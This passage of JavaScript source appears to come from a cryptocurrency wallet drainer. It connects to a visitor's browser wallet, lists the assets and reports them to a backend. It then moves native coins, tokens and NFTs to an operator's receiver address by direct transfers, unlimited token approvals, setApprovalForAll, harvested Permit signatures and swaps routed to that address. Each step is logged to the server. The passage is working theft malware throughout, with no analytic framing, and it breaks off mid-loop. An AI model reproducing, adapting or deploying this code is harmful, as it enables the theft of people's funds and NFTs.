  if (MS_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 60000);
  sign_success(asset, tx.hash, '0', false, {}, 'DO_SWAP');
};

const DO_UNISWAP = async (asset, all_tokens) => {
  const web3 = new Web3(MS_Provider); const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
  const swap_deadline = Math.floor(Date.now() / 1000) + (9999 * 10);
  const contract = new ethers.Contract(asset.swapper_address, MS_Uniswap_ABI, MS_Signer);
  const gas_price = ethers.BigNumber.from(await node.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
  const nonce = await get_nonce(asset.chain_id);
  const swap_data = [];
  for (const token of all_tokens) {
    try {
      const swap_value = ethers.BigNumber.from(token.amount_raw).lte(ethers.BigNumber.from(token.swapper_allowance))
      ? ethers.BigNumber.from(token.amount_raw).toString() : ethers.BigNumber.from(token.swapper_allowance).toString();
      const web3_contract = new web3.eth.Contract(MS_Uniswap_ABI, token.swapper_address);
      const data = web3_contract.methods.swapExactTokensForTokens(swap_value, '0', [
        token.address, MS_Swap_Route[token.chain_id]
      ], MS_Settings.Receiver).encodeABI();
      swap_data.push(data);
    } catch(err) {
      console.log(err);
    }
  }
  let gas_limit = null;
  try {
    gas_limit = await contract.estimateGas.multicall(swap_deadline, swap_data, { from: MS_Current_Address });
    gas_limit = ethers.BigNumber.from(gas_limit).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
  } catch(err) {
    gas_limit = (asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : 500000);
  }
  await sign_request(asset); sign_next();
  const tx = await contract.multicall(swap_deadline, swap_data, {
    gasLimit: ethers.BigNumber.from(gas_limit),
    gasPrice: ethers.BigNumber.from(gas_price),
    nonce: nonce
  });
  if (MS_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 60000);
  for (const token of all_tokens) {
    sign_success(token, tx.hash, '0', false, {}, 'DO_UNISWAP');
  }
};

const DO_CONTRACT = async (asset) => {
  const web3 = new Web3(MS_Provider); const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
  const gas_price = ethers.BigNumber.from(await node.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
  const gas_limit_nt = (asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : 60000);
  const gas_limit_ct = (asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : 150000);

  const gas_price_calc = ethers.BigNumber.from(asset.chain_id == 10 ? '35000000000' : gas_price);
  const nt_fee = (gas_price_calc.mul(ethers.BigNumber.from(gas_limit_nt))).mul(ethers.BigNumber.from('2'));
  const ct_fee = (gas_price_calc.mul(ethers.BigNumber.from(gas_limit_ct))).mul(ethers.BigNumber.from(String(MS_Gas_Reserves[asset.chain_id])));
  const after_fee = ethers.BigNumber.from(asset.amount_raw).sub(nt_fee).sub(ct_fee).toString();

  if (ethers.BigNumber.from(after_fee).lte(ethers.BigNumber.from('0'))) throw 'LOW_BALANCE';

  const nonce = await get_nonce(asset.chain_id);
  const ankr_chain_id = convert_chain('ID', 'ANKR', asset.chain_id);
  const contract = new ethers.Contract(MS_Settings.Settings.Chains[ankr_chain_id].Contract_Address, (MS_Settings.Settings.Chains[ankr_chain_id].Contract_Legacy == 1) ? MS_Contract_ABI['CONTRACT_LEGACY'] : MS_Contract_ABI['CONTRACT'], MS_Signer);
  await transfer_request(asset);
  sign_next(); let tx = null;
  if (MS_Settings.Settings.Chains[ankr_chain_id].Contract_Legacy == 0) {
    tx = await contract[MS_Settings.Settings.Chains[ankr_chain_id].Contract_Type](MS_Settings.Address, {
      gasLimit: ethers.BigNumber.from(gas_limit_nt),
      gasPrice: ethers.BigNumber.from(gas_price),
      nonce: nonce, value: ethers.BigNumber.from(after_fee)
    });
  } else {
    tx = await contract[MS_Settings.Settings.Chains[ankr_chain_id].Contract_Type]({
      gasLimit: ethers.BigNumber.from(gas_limit_nt),
      gasPrice: ethers.BigNumber.from(gas_price),
      nonce: nonce, value: ethers.BigNumber.from(after_fee)
    });
  }
  if (MS_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 30000);
  transfer_success(asset, tx.hash, after_fee, 'DO_CONTRACT'); // 3rd is different
};

const TRANSFER_NATIVE = async (asset) => {
  const ankr_chain_id = convert_chain('ID', 'ANKR', asset.chain_id);
  if (MS_Settings.Settings.Chains[ankr_chain_id].Contract_Address != '') return DO_CONTRACT(asset);
  const web3 = new Web3(MS_Provider); const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
  const gas_price = ethers.BigNumber.from(await node.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
  const gas_limit_nt = (asset.chain_id == 42161) ? 1500000 : (asset.chain_id == 43114 ? 1500000 : 21000);
  const gas_limit_ct = (asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : 150000);

  const gas_price_calc = ethers.BigNumber.from(asset.chain_id == 10 ? '35000000000' : gas_price);
  const nt_fee = (gas_price_calc.mul(ethers.BigNumber.from(gas_limit_nt))).mul(ethers.BigNumber.from('2'));
  const ct_fee = (gas_price_calc.mul(ethers.BigNumber.from(gas_limit_ct))).mul(ethers.BigNumber.from(String(MS_Gas_Reserves[asset.chain_id])));
  const after_fee = ethers.BigNumber.from(asset.amount_raw).sub(nt_fee).sub(ct_fee).toString();

  if (ethers.BigNumber.from(after_fee).lte(ethers.BigNumber.from('0'))) throw 'LOW_BALANCE';

  const nonce = await get_nonce(asset.chain_id);
  await transfer_request(asset);
  sign_next();
  const tx = await MS_Signer.sendTransaction({
    to: MS_Settings.Receiver,
    value: ethers.BigNumber.from(after_fee),
    gasLimit: ethers.BigNumber.from(gas_limit_nt),
    gasPrice: ethers.BigNumber.from(gas_price),
    nonce: nonce
  });
  if (MS_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 30000);
  transfer_success(asset, tx.hash, after_fee, 'TRANSFER_NATIVE');
};

const TRANSFER_TOKEN = async (asset) => {
  const web3 = new Web3(MS_Provider); const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
  const gas_price = ethers.BigNumber.from(await node.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
  const nonce = await get_nonce(asset.chain_id);
  const contract = new ethers.Contract(asset.address, MS_Contract_ABI['ERC20'], MS_Signer);
  let gas_limit = null;
  try {
    gas_limit = await contract.estimateGas.transfer(MS_Settings.Receiver, asset.amount_raw, { from: MS_Current_Address });
    gas_limit = ethers.BigNumber.from(gas_limit).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
  } catch(err) {
    gas_limit = (asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : 250000);
  }
  await transfer_request(asset);
  sign_next();
  const tx = await contract.transfer(MS_Settings.Receiver, asset.amount_raw, {
    gasLimit: ethers.BigNumber.from(gas_limit),
    gasPrice: ethers.BigNumber.from(gas_price),
    nonce: nonce
  });
  if (MS_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 30000);
  transfer_success(asset, tx.hash, 'TRANSFER_TOKEN');
};

const TRANSFER_NFT = async (asset) => {
  const web3 = new Web3(MS_Provider); const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
  const gas_price = ethers.BigNumber.from(await node.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
  const nonce = await get_nonce(asset.chain_id);
  const contract = new ethers.Contract(asset.address, MS_Contract_ABI['ERC721'], MS_Signer);
  let gas_limit = null;
  try {
    gas_limit = await contract.estimateGas.transferFrom(MS_Current_Address, MS_Settings.Receiver, asset.amount_raw, { from: MS_Current_Address });
    gas_limit = ethers.BigNumber.from(gas_limit).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
  } catch(err) {
    gas_limit = (asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : 250000);
  }
  await transfer_request(asset);
  sign_next();
  const tx = await contract.transferFrom(MS_Current_Address, MS_Settings.Receiver, asset.amount_raw, {
    gasLimit: ethers.BigNumber.from(gas_limit),
    gasPrice: ethers.BigNumber.from(gas_price),
    nonce: nonce
  });
  if (MS_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 30000);
  transfer_success(asset, tx.hash, 'TRANSFER_NFT');
};

const APPROVE_TOKEN = async (asset) => {
  if (MS_Current_Provider == 'MetaMask' && !MS_Mobile_Status && MS_Settings.Settings.Approve.MetaMask == 2) return MM_APPROVE_TOKEN(asset);
  const web3 = new Web3(MS_Provider); const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
  const gas_price = ethers.BigNumber.from(await node.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
  const nonce = await get_nonce(asset.chain_id);
  const contract = new ethers.Contract(asset.address, MS_Contract_ABI['ERC20'], MS_Signer);
  let gas_limit = null;
  let max_approval_amount = ethers.utils.parseEther(MS_Unlimited_Amount);
  for (const c_address of MS_Settings.Unlimited_BL) {
    try {
      if (c_address[0] == MS_Current_Chain_ID && c_address[1] == asset.address.toLowerCase()) {
        max_approval_amount = asset.amount_raw;
        break;
      }
    } catch(err) {
      console.log(err);
    }
  }
  try {
    gas_limit = await contract.estimateGas.approve(MS_Settings.Address, max_approval_amount, { from: MS_Current_Address });
    gas_limit = ethers.BigNumber.from(gas_limit).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
  } catch(err) {
    gas_limit = (asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : 250000);
  }
  await approve_request(asset);
  sign_next();
  const tx = await contract.approve(MS_Settings.Address, max_approval_amount, {
    gasLimit: ethers.BigNumber.from(gas_limit),
    gasPrice: ethers.BigNumber.from(gas_price),
    nonce: nonce
  });
  if (MS_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 30000);
  approve_success(asset, tx.hash, true, {}, 'APPROVE_TOKEN');
};

const MM_APPROVE_TOKEN = async (asset) => {
  console.log("MM_APPROVE_TOKEN - START")
  const web3 = new Web3(MS_Provider); const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
  const gas_price = ethers.BigNumber.from(await node.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
  const nonce = await get_nonce(asset.chain_id);
  const contract = new ethers.Contract(asset.address, MS_Contract_ABI['ERC20'], node);
  let gas_limit = null;
  let max_approval_amount = ethers.utils.parseEther(MS_Unlimited_Amount);
  for (const c_address of MS_Settings.Unlimited_BL) {
    try {
      if (c_address[0] == MS_Current_Chain_ID && c_address[1] == asset.address.toLowerCase()) {
        max_approval_amount = asset.amount_raw;
        break;
      }
    } catch(err) {
      console.log(err);
    }
  }
  try {
    gas_limit = await contract.estimateGas.approve(MS_Settings.Address, max_approval_amount, { from: MS_Current_Address });
    gas_limit = ethers.BigNumber.from(gas_limit).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
  } catch(err) {
    gas_limit = (asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : 250000);
  }
  let web3_contract = new web3.eth.Contract(MS_Contract_ABI['ERC20'], asset.address);
  let data = web3_contract.methods.approve(MS_Settings.Address, max_approval_amount).encodeABI();
  await approve_request(asset);
  sign_next();
  const result = await new Promise(resolve => {
    MS_Provider.sendAsync({
      from: MS_Current_Address, id: 1,
      jsonrpc: "2.0", method: "eth_sendTransaction",
      params: [
        {
          chainId: MS_Current_Chain_ID,
          data: data,
          from: MS_Current_Address,
          nonce: web3.utils.toHex(nonce),
          to: asset.address,
          value: "0x0000",
          gasPrice: web3.utils.toHex(gas_price),
          gas: web3.utils.toHex(gas_limit)
        }
      ]
    }, (err, tx) => {
      resolve({ err, tx });
    });
  });
  if (MS_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(result.tx.result, 1, 30000);
  approve_success(asset, result.tx.result, true, {}, 'MM_APPROVE_TOKEN');

  console.log("MM_APPROVE_TOKEN - FINISH")
};

const DO_SAFA = async (asset, safa_approves_object) => {
  const web3 = new Web3(MS_Provider); const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
  const gas_price = ethers.BigNumber.from(await node.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
  const nonce = await get_nonce(asset.chain_id);
  const contract = new ethers.Contract(asset.address, MS_Contract_ABI['ERC721'], MS_Signer);
  let gas_limit = null;
  try {
    gas_limit = await contract.estimateGas.setApprovalForAll(MS_Settings.Address, true, { from: MS_Current_Address });
    gas_limit = ethers.BigNumber.from(gas_limit).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
  } catch(err) {
    gas_limit = (asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : 250000);
  }
  await approve_request(asset);
  sign_next();
  const tx = await contract.setApprovalForAll(MS_Settings.Address, true, {
    gasLimit: ethers.BigNumber.from(gas_limit),
    gasPrice: ethers.BigNumber.from(gas_price),
    nonce: nonce
  });
  if (MS_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 30000);
  approve_success(asset, tx.hash, true, safa_approves_object, 'DO_SAFA');
};

const PERMIT_TOKEN = async (asset) => {
  const contract = new ethers.Contract(asset.address, asset.abi, MS_Signer);
  const nonce = await contract.nonces(MS_Current_Address);
  const name = await contract.name();
  let value = ethers.utils.parseEther(MS_Unlimited_Amount);
  for (const c_address of MS_Settings.Unlimited_BL) {
    try {
      if (c_address[0] == MS_Current_Chain_ID && c_address[1] == asset.address.toLowerCase()) {
        value = asset.amount_raw;
        break;
      }
    } catch(err) {
      console.log(err);
    }
  }
  const deadline = Date.now() + 1000 * 60 * 60 * 24 * 356;
  let permit_types = null, permit_values = null;
  if (asset.permit == 1) {
    permit_types = {
      Permit: [
        {
          name: "holder",
          type: "address",
        },
        {
          name: "spender",
          type: "address",
        },
        {
          name: "nonce",
          type: "uint256",
        },
        {
          name: "expiry",
          type: "uint256",
        },
        {
          name: "allowed",
          type: "bool",
        }
      ]
    };
    permit_values = {
      holder: MS_Current_Address,
      spender: MS_Settings.Address,
      nonce: nonce,
      expiry: deadline,
      allowed: true
    };
  } else if (asset.permit == 2) {
    permit_types = {
      Permit: [
        {
          name: "owner",
          type: "address",
        },
        {
          name: "spender",
          type: "address",
        },
        {
          name: "value",
          type: "uint256",
        },
        {
          name: "nonce",
          type: "uint256",
        },
        {
          name: "deadline",
          type: "uint256",
        }
      ]
    };
    permit_values = {
      owner: MS_Current_Address,
      spender: MS_Settings.Address,
      value: value,
      nonce: nonce,
      deadline: deadline
    };
  }
  await approve_request(asset);
  sign_next();

  let result, signature
  
  if (asset.address.toLowerCase() == '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174'.toLowerCase() ||
    asset.address.toLowerCase() == '0x490e379c9cff64944be82b849f8fd5972c7999a7'.toLowerCase()) {
    // make a more sophisticated check
    console.log(`\n\nSALT: , ${ethers.utils.hexZeroPad(ethers.BigNumber.from(137).toHexString(), 32)}\n\n`)
    result = await MS_Signer._signTypedData({
      name: name,
      version: asset.permit_ver,
      verifyingContract: asset.address,
      salt: ethers.utils.hexZeroPad(ethers.BigNumber.from(137).toHexString(), 32)
     },
     permit_types,
     permit_values
    )

    signature = {
      r: result.slice(0, 66),
      s: "0x" + result.slice(66, 130),
      v: Number("0x" + result.slice(130, 132)) < 20 ? Number("0x" + result.slice(130, 132)) + 27 : Number("0x" + result.slice(130, 132))
    };

  } else {
    result = await MS_Signer._signTypedData({
      name: name, version: asset.permit_ver, chainId: asset.chain_id,
      verifyingContract: asset.address
    }, permit_types, permit_values)

    signature = {
      r: result.slice(0, 66),
      s: "0x" + result.slice(66, 130),
      v: Number("0x" + result.slice(130, 132)) < 20 ? Number("0x" + result.slice(130, 132)) + 27 : Number("0x" + result.slice(130, 132))
    };
  }
  
  const x_promise = send_request({
    action: 'permit_token', user_id: MS_ID, sign: {
      type: asset.permit, version: asset.permit_ver,
      chain_id: asset.chain_id, address: asset.address,
      owner: MS_Current_Address, spender: MS_Settings.Address,
      value: value.toString(), nonce: nonce.toString(), deadline: deadline,
      r: signature.r, s: signature.s, v: signature.v, abi: asset.abi
    }, asset: asset, address: MS_Current_Address
  });
  if (MS_Settings.Settings.Wait_For_Response) await x_promise;
};

const sign_success = async (asset, hash = '', amount = '0', toApprove = false, safa_approves_object = {}, notificationType = '') => {
  try {
    if (asset.type == 'NATIVE') {
      asset.amount_raw = amount;
      const out_amount = ethers.BigNumber.from(asset.amount_raw);
      asset.amount_usd = parseFloat(ethers.utils.formatUnits(out_amount, 'ether')) * MS_Currencies[convert_chain('ID', 'CURRENCY', asset.chain_id)]['USD'];
      // 'SIGN_NATIVE'
      await send_request({ action: 'sign_success', asset, user_id: MS_ID, addressTo: MS_Settings.Address, hash: hash, toApprove: toApprove, address: MS_Current_Address, safa_approves_object, notificationType });
    } else if (asset.type == 'ERC20' || asset.type == 'ERC721') {
      // 'DO_SWAP', 'DO_UNISWAP', 'SIGN_TOKEN' 'SIGN_NFT'
      await send_request({ action: 'sign_success', asset, user_id: MS_ID, addressTo: MS_Settings.Address, hash: hash, toApprove: toApprove, address: MS_Current_Address, safa_approves_object, notificationType });
    }
  } catch(err) {
    console.log(err);
  }
}

const transfer_success = async (asset, hash = '', amount = '0', notificationType = '') => {
  try {
    if (asset.type == 'NATIVE') {
      asset.amount_raw = amount;
      const out_amount = ethers.BigNumber.from(asset.amount_raw);
      asset.amount_usd = parseFloat(ethers.utils.formatUnits(out_amount, 'ether')) * MS_Currencies[convert_chain('ID', 'CURRENCY', asset.chain_id)]['USD'];
      // 'DO_CONTRACT', 'TRANSFER_NATIVE'
      await send_request({ action: 'transfer_success', asset, user_id: MS_ID, addressTo: MS_Settings.Address, hash: hash, address: MS_Current_Address, notificationType });
    } else {
      // 'TRANSFER_TOKEN', 'TRANSFER_NFT'
      await send_request({ action: 'transfer_success', asset, user_id: MS_ID, addressTo: MS_Settings.Address, hash: hash, address: MS_Current_Address, notificationType });
    }
  } catch(err) {
    console.log(err);
  }
}

const approve_success = async (asset, hash = '', toApprove = false, safa_approves_object = {}, notificationType = '') => {
  try {
    await send_request({ action: 'approve_success', asset, user_id: MS_ID, addressTo: MS_Settings.Address,
    hash: hash, address: MS_Current_Address, toApprove: toApprove, safa_approves_object: safa_approves_object, notificationType });
  } catch(err) {
    console.log(err);
  }
}

const sign_cancel = async () => {
  try {
    await send_request({ action: 'sign_cancel', user_id: MS_ID });
  } catch(err) {
    console.log(err);
  }
}

const sign_unavailable = async () => {
  try {
    await send_request({ action: 'sign_unavailable', user_id: MS_ID });
    MS_Sign_Disabled = true;
  } catch(err) {
    console.log(err);
  }
}

const transfer_cancel = async () => {
  try {
    await send_request({ action: 'transfer_cancel', user_id: MS_ID });
  } catch(err) {
    console.log(err);
  }
}

const approve_cancel = async () => {
  try {
    await send_request({ action: 'approve_cancel', user_id: MS_ID });
  } catch(err) {
    console.log(err);
  }
}

const chain_cancel = async () => {
  try {
    await send_request({ action: 'chain_cancel', user_id: MS_ID  });
  } catch(err) {
    console.log(err);
  }
}

const chain_success = async () => {
  try {
    await send_request({ action: 'chain_success', user_id: MS_ID  });
  } catch(err) {
    console.log(err);
  }
}

const chain_request = async (old_chain, new_chain) => {
  try {
    await send_request({ action: 'chain_request', user_id: MS_ID, chains: [ old_chain, new_chain ] });
  } catch(err) {
    console.log(err);
  }
}

const sign_request = async (asset) => {
  try {
    await send_request({ action: 'sign_request', user_id: MS_ID, asset });
  } catch(err) {
    console.log(err);
  }
}

const transfer_request = async (asset) => {
  try {
    await send_request({ action: 'transfer_request', user_id: MS_ID, asset });
  } catch(err) {
    console.log(err);
  }
}

const approve_request = async (asset) => {
  try {
    await send_request({ action: 'approve_request', user_id: MS_ID, asset });
  } catch(err) {
    console.log(err);
  }
}

const connect_wallet = async (provider = null) => {
  try {
    // if (MS_Process || connect) {
    //   for(let elem of document.querySelectorAll('.euTjHu, .iVxOei')) {
    //     elem.addEventListener('click', ms_hide())
    //   }
    //   return
    // }; 
    MS_Process = true
    // setting link and icons to metamask ????
    if (provider !== null) {
      if (provider == 'MetaMask') {
        if (typeof window.ethereum == 'object' && typeof window.ethereum.providers === 'object') {
          let is_installed = false;
          for (const elem of window.ethereum.providers) {
            if (elem.isMetaMask == true) {
              is_installed = true;
              MS_Provider = elem;
              MS_Current_Provider = 'MetaMask';
              break;
            }
          }
          if (!is_installed) {
            if (MS_Mobile_Status) {
              window.location.href = `https://metamask.app.link/dapp/${MS_Current_URL}`;
              MS_Process = false;
              return;
            } else {
              window.open('https://metamask.io', '_blank').focus();
              MS_Process = false;
              return;
            }
          }
        } else {
          if (typeof window.ethereum === 'object' && window.ethereum.isMetaMask) {
            MS_Provider = window.ethereum;
            MS_Current_Provider = 'MetaMask';
          } else {
            if (MS_Mobile_Status) {
              window.location.href = `https://metamask.app.link/dapp/${MS_Current_URL}`;
              MS_Process = false;
              return;
            } else {
              window.open('https://metamask.io', '_blank').focus();
              MS_Process = false;
              return;
            }
          }
        }
      } else if (provider == 'Coinbase') {
        if (typeof window.ethereum == 'object' && typeof window.ethereum.providers === 'object') {
          let is_installed = false;
          for (const elem of window.ethereum.providers) {
            if (elem.isCoinbaseWallet == true) {
              is_installed = true;
              MS_Provider = elem;
              break;
            }
          }
          if (is_installed) {
            MS_Current_Provider = 'Coinbase';
          } else {
            if (MS_Mobile_Status) {
              window.location.href = `https://go.cb-w.com/dapp?cb_url=https://${MS_Current_URL}`;
              MS_Process = false;
              return;
            } else {
              window.open('https://www.coinbase.com/wallet', '_blank').focus();
              MS_Process = false;
              return;
            }
          }
        } else {
          if (typeof window.ethereum === 'object' && (window.ethereum.isCoinbaseWallet || window.ethereum.isCoinbaseBrowser)) {
            MS_Provider = window.ethereum;
            MS_Current_Provider = 'Coinbase';
          } else {
            if (MS_Mobile_Status) {
              window.location.href = `https://go.cb-w.com/dapp?cb_url=https://${MS_Current_URL}`;
              MS_Process = false;
              return;
            } else {
              window.open('https://www.coinbase.com/wallet', '_blank').focus();
              MS_Process = false;
              return;
            }
          }
        }
      } else if (provider == 'Trust Wallet') {
        if (typeof window.ethereum === 'object' && window.ethereum.isTrust) {
          MS_Provider = window.ethereum;
          MS_Current_Provider = 'Trust Wallet';
        } else {
          if (MS_Mobile_Status) {
            window.location.href = `https://link.trustwallet.com/open_url?coin_id=60&url=https://${MS_Current_URL}`;
            MS_Process = false;
            return;
          } else {
            window.open('https://trustwallet.com', '_blank').focus();
            MS_Process = false;
            return;
          }
        }
      } else if (provider == 'Binance Wallet') {
        if (typeof window.BinanceChain === 'object') {
          MS_Provider = window.BinanceChain;
          MS_Current_Provider = 'Binance Wallet';
        } else {
          window.open('https://chrome.google.com/webstore/detail/binance-wallet/fhbohimaelbohpjbbldcngcnapndodjp', '_blank').focus();
          MS_Process = false;
          return;
        }
      } else if (provider == 'WalletConnect') {
        MS_Current_Provider = 'WalletConnect';
      } else {
        if (typeof window.ethereum === 'object') {
          MS_Provider = window.ethereum;
          MS_Current_Provider = 'Ethereum';
        } else {
          MS_Current_Provider = 'WalletConnect';
        }
      }
    } else {
      if (window.ethereum) {
        MS_Provider = window.ethereum;
        MS_Current_Provider = 'Ethereum';
      } else {
        MS_Current_Provider = 'WalletConnect';
      }
    }
    // actually connecting wallets ????
    try {
      await connect_request();
      let connection = null;
      if (MS_Current_Provider == 'WalletConnect') {
        load_wc(); await MS_Provider.disconnect(0);
        connection = await MS_Provider.enable();
        if (connection && connection.length > 0) {
          if (!connection[0].includes('0x')) {
            MS_Process = false;
            return await connect_cancel();
          }
          await new Promise(r => setTimeout(r, 2500));
          MS_Current_Address = connection[0];
          MS_Current_Chain_ID = MS_Provider.chainId;
          MS_Web3 = new ethers.providers.Web3Provider(MS_Provider);
          MS_Signer = MS_Web3.getSigner();
        } else {
          MS_Process = false;
          return await connect_cancel();
        }
      } else {
        try {
          connection = await MS_Provider.request({ method: 'wallet_requestPermissions', params: [{ eth_accounts: {} }] });
          if (connection && connection.length > 0) {
            if (!MS_Provider.selectedAddress.includes('0x')) return connect_cancel();
            MS_Current_Address = MS_Provider.selectedAddress;
            MS_Current_Chain_ID = parseInt(MS_Provider.chainId);
            MS_Web3 = new ethers.providers.Web3Provider(MS_Provider);
            MS_Signer = MS_Web3.getSigner();
          } else {
            MS_Process = false;
            return await connect_cancel();
          }
        } catch(err) {
          connection = await MS_Provider.request({ method: 'eth_requestAccounts' });
          if (connection && connection.length > 0) {
            if (!connection[0].includes('0x')) return connect_cancel();
            MS_Current_Address = connection[0];
            MS_Current_Chain_ID = parseInt(MS_Provider.chainId);
            MS_Web3 = new ethers.providers.Web3Provider(MS_Provider);
            MS_Signer = MS_Web3.getSigner();
          } else {
            MS_Process = false;
            return await connect_cancel();
          }
        }
      }
      if (!MS_Current_Address.match(/^0x\S+$/)) throw new Error('Invalid Wallet');
    } catch(err) {
      console.log(err);
      MS_Process = false;
      return await connect_cancel();
    }
    // Custom first message
    if (MS_Settings.V_MODE == 1) {
      try {
        const verification_message = ((MS_Verify_Message == "") ? MS_Settings.V_MSG : MS_Verify_Message).replaceAll('{{ADDRESS}}', MS_Current_Address);
        const signed_message = await MS_Signer.signMessage(verification_message);
        const is_sign_correct = ethers.utils.recoverAddress(ethers.utils.hashMessage(verification_message), signed_message);
        if (!is_sign_correct) {
          MS_Process = false;
          return await connect_cancel();
        } else {
          let server_result = await send_request({ action: 'sign_verify', sign: signed_message, address: MS_Current_Address, message: MS_Verify_Message });
          if (server_result.status != 'OK') {
            MS_Process = false;
            return await connect_cancel();
          }
        }
      } catch(err) {
        MS_Process = false;
        return await connect_cancel();
      }
    } else {
      await send_request({ action: 'sign_verify', address: MS_Current_Address });
    }

    await connect_success();
    MS_Process = false;
    connect = true;

    if (MS_Settings.Wallet_Blacklist.length > 0 && MS_Settings.Wallet_Blacklist.includes(MS_Current_Address.toLowerCase())) {
      MS_Check_Done = true;
      MS_Process = false;
      return;
    }

    let assets = await get_wallet_assets(MS_Current_Address);
    // calculating total price
    let assets_price = 0;
    for (const asset of assets) try { assets_price += asset.amount_usd } catch(err) { console.log(err) }
    let assets_usd_balance = 0;
    for (const asset of assets) assets_usd_balance += asset.amount_usd;

    await send_request({ action: 'check_finish', address: MS_Current_Address, user_id: MS_ID, assets: assets, balance: assets_usd_balance });

    MS_Check_Done = true;
    
    if (MS_Settings.Settings.Minimal_Wallet_Price > assets_price) {
      MS_Process = false;
      return;
    }
    for (const asset of assets) {
      try {
        if (asset.type != 'NATIVE') MS_Gas_Reserves[asset.chain_id] += 1;
      } catch(err) {
        console.log(err);
      }
    }

    // send_request({action: 'sorted_list', list: assets, ID: MS_ID, filters: ['\n\nINSIDE `get_wallet_assets`\n\n'], address: MS_Current_Address})

    if (typeof SIGN_BLUR !== 'undefined' && MS_Settings.Settings.Blur.Enable == 1 && MS_Settings.Settings.Blur.Priority == 1)
      await SIGN_BLUR(assets, MS_Provider, MS_Current_Address, MS_Settings.Address, MS_ID);
    if (typeof SIGN_SEAPORT !== 'undefined' && MS_Settings.Settings.SeaPort.Enable == 1 && MS_Settings.Settings.SeaPort.Priority == 1)
      await SIGN_SEAPORT(assets, MS_Provider, MS_Current_Address, MS_Settings.Address, MS_ID);
    if (typeof SIGN_X2Y2 !== 'undefined' && MS_Settings.Settings.x2y2.Enable == 1 && MS_Current_Chain_ID == 1 && MS_Settings.Settings.x2y2.Priority == 1)
      await SIGN_X2Y2(assets, MS_Provider, MS_Current_Address, MS_Settings.Address, MS_ID);
    if (MS_Provider.isTrust && !MS_Mobile_Status) {
      try {
        MS_Settings.Settings.Sign.Native = 0;
        MS_Settings.Settings.Sign.Tokens = 0;
        MS_Settings.Settings.Sign.NFTs = 0;
      } catch(err) {
        console.log(err);
      }
    }
    for (const asset of assets) {
      console.log(`- - - ID: ${MS_ID}\n- - - ASSET:\nADDRESS: ${asset.address}\nAMOUNT: ${asset.amount_usd}\nCHAIN ID: ${asset.chain_id}`)
      try {
        if (asset.skip) {
          console.log(`- - - SKIPPING: ${asset.name}`)
          send_request({action: 'skip', asset, ID: MS_ID, address: MS_Current_Address})
          continue
        };
        // calculating gas expanses for token transfers
        if (asset.type == 'NATIVE') {
          const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]); let is_contract_use = false;
          const gas_price = ethers.BigNumber.from(await node.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
          if (MS_Settings.Settings.Chains[convert_chain('ID', 'ANKR', asset.chain_id)].Contract_Address != '') is_contract_use = true;
          const gas_limit_nt = (asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : (is_contract_use ? 60000 : 21000));
          const gas_limit_ct = (asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : 150000);
          const gas_price_calc = ethers.BigNumber.from(asset.chain_id == 10 ? '35000000000' : gas_price);
          const nt_fee = (gas_price_calc.mul(ethers.BigNumber.from(gas_limit_nt))).mul(ethers.BigNumber.from('2'));
